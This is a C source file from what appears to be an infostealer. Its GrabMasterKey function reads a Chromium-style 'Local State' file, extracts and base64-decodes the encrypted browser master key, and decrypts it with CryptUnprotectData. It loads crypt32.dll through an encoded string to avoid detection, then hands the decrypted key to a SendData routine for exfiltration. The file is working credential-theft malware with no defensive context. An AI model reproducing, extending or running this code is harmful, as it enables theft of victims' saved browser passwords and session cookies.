#include "../include/decoding.h"
#include "../include/StringUtils.h"
#include "../include/DllOps.h"
#include "../include/AddrResolution.h"
#include "../include/macros.h"
#include "../include/MemoryUtils.h"
#include "../include/FileIO.h"
#include "../include/PathOps.h"
#include "../include/MasterKeyGrabber.h"
#include "../include/SendData.h"

#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>

BOOL (WINAPI *pCryptUnprotectData)(DATA_BLOB*, LPWSTR, DATA_BLOB*, PVOID, CRYPTPROTECT_PROMPTSTRUCT*, DWORD, DATA_BLOB*);

void GrabMasterKey(unsigned short *path) {
    HANDLE              FileHandle           = {0};
    UNICODE_STRING      PathUnicode          = {0};
    OBJECT_ATTRIBUTES   PathObj              = {0};
    DATA_BLOB           VaultKey             = {0};
    DATA_BLOB           CryptedVaultKey      = {0};
    void               *Crypt32Dll           = {0};
    char                FileSizeString[20]   = {0};
    unsigned char       DecodedString[500]   = {0};
    unsigned char       Base64String[450]    = {0};
    unsigned char      *FileBuffer           = {0};
    unsigned char      *buffer               = {0};
    unsigned short     *TempPath[250]        = {0};
    int                 FullBufferSize       = 0;
    int                 FileSize             = 0;
    int                 TotalBufferSize      = 0;
    int                 PathSize             = lenW(path);
    int                 i = 0, j = 0, k = 0;

    MovMemory(path, TempPath, PathSize * 2);
    ConcatStringW(TempPath, L"\\Local State", PathSize);

    InitPathObj(TempPath, &PathObj, &PathUnicode);
    if (OpenFileY(&FileHandle, FILE_READ_DATA | SYNCHRONIZE, &PathObj, FILE_OPEN) != 0) {
        return;
    }

    FileSize = GetFileSizeY(FileHandle);
    
    FileBuffer = AllocMemory((SIZE_T)FileSize);
    if (FileBuffer == NULL) {
        return;
    }

    if (ReadFileY(FileHandle, FileBuffer, FileSize) != 0) {
        return;
    }


    while(FileSize > k) {
        if (FileBuffer[i] == '\"' && FileBuffer[i + 1] == 'e' && FileBuffer[i + 2] == 'n' && FileBuffer[i + 3] == 'c' && FileBuffer[i + 4] == 'r' && FileBuffer[i + 5] == 'y' && FileBuffer[i + 6] == 'p' && FileBuffer[i + 7] == 't' && FileBuffer[i + 8] == 'e' && FileBuffer[i + 9] == 'd' && FileBuffer[i + 10] == '_' && FileBuffer[i + 11] == 'k' && FileBuffer[i + 12] == 'e' && FileBuffer[i + 13] == 'y') {
            i += 17;
            while(TRUE) {
                if (FileBuffer[i] == 0x22) {
                    break;
                }
                Base64String[j] = FileBuffer[i];
                j++;
                i++;
            }
            Base64String[j] = 0x00;
            break;
        }
        i++;
        k++;
    }

    if (Base64String == NULL) {
        return;
    }

    int DecodedLength = DecodeBase64(Base64String, len(Base64String), DecodedString);
    if (DecodedLength == 1) {
        return;
    }

    MovMemory(DecodedString + 5, DecodedString, DecodedLength);
    CryptedVaultKey.cbData = DecodedLength;
    CryptedVaultKey.pbData = DecodedString;

    /*the passed argument is just crypt32.dll encoded*/
    Crypt32Dll = LoadDll((unsigned short[12]){0x0068, 0x00d0, 0x008d, 0x00d5, 0x007f, 0x009c, 0x0068, 0x0032, 0x008e, 0x00a6, 0x009e, 0x0000});
    if (Crypt32Dll == NULL) {
        return;
    }
    pCryptUnprotectData = GetFuncAddress(Crypt32Dll, CRYPTOUNPROTECTDATA);
    if (pCryptUnprotectData == NULL) {
        return;
    }

    if (pCryptUnprotectData(&CryptedVaultKey, NULL, NULL, NULL, NULL, 0, &VaultKey) != 1) {
        return;
    }

    TotalBufferSize = TotalBufferLength(L"ZERO", 32);

    buffer = AllocMemory((SIZE_T)TotalBufferSize);
    if (buffer == NULL) {
        return;
    }

    IntToString(FileSizeString, 32);

    SendData(NULL, "ZERO", 32, FileSizeString, buffer, VaultKey.pbData, FALSE);

    FreeMemory(FileBuffer);
}